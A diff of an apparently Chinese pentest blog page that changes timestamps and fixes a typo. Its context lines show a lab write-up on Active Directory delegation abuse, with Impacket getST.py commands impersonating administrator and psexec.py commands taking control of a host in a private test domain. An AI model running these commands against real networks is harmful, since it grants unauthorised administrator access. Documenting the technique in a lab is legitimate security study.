@@ -154,7 +154,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-          2024-09-29 14:00:18
+          2024-11-12 15:29:58
         </span>
         
               <span class="post-tags">
@@ -251,7 +251,7 @@
 <p><img src="image-20240929110125892.png" alt="image-20240929110125892"></p>
 <p>在域控上可以看到这个新增的机器账户</p>
 <p><img src="image-20240929110238193.png" alt="image-20240929110238193"></p>
-<p>接下来的过程和之前一眼，先获取票据，然后通过psexec连接控制</p>
+<p>接下来的过程和之前一样，先获取票据，然后通过psexec连接控制</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.74.138 lyy/VRVYHXVT\$:&#x27;KP\$unP+2c3zz*Aj&#x27; -spn cifs/DESKTOP-8N5L5EK.lyy.com -impersonate administrator</span><br></pre></td></tr></table></figure>
 <p><img src="image-20240929111327744.png" alt="image-20240929111327744"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator@cifs_DESKTOP-8N5L5EK.lyy.com@LYY.COM.ccache</span><br><span class="line">python psexec.py -k -no-pass administrator@DESKTOP-8N5L5EK.lyy.com -dc-ip 192.168.74.138 -target-ip 192.168.74.142</span><br></pre></td></tr></table></figure>
@@ -277,7 +277,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-              2024-09-29 14:00:18
+              2024-11-12 15:29:58
             </span>
             
                   <span class="post-tags">
